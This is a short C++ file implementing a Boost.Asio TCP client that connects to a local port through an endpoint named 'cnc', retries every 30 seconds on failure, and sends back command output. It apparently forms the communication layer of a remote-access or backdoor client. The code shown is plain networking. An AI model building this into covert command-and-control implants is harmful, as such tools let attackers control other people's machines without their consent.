#include <iostream>
#include <boost/asio.hpp>
#include <array>
#include "client.h"

using boost::asio::ip::tcp;

void Client::Connect()
{
	boost::asio::ip::address addr = boost::asio::ip::address::from_string("127.0.0.1");
	unsigned short port = 27016;
	tcp::endpoint cnc(addr, port);

	try
	{
		m_sock.connect(cnc);
	}
	catch (boost::system::system_error&)
	{
		m_sock.close();
		Sleep(30 * 1000);
		Connect();
	}
}

void Client::Send(std::string&& data)
{
	if (data.empty())
		m_sock.send(boost::asio::buffer("No output.\n"));
	m_sock.send(boost::asio::buffer(data));
}

std::string Client::Receive()
{
	std::string data;
	data.resize(1024);
	m_sock.receive(boost::asio::buffer(data));
	return data;
}
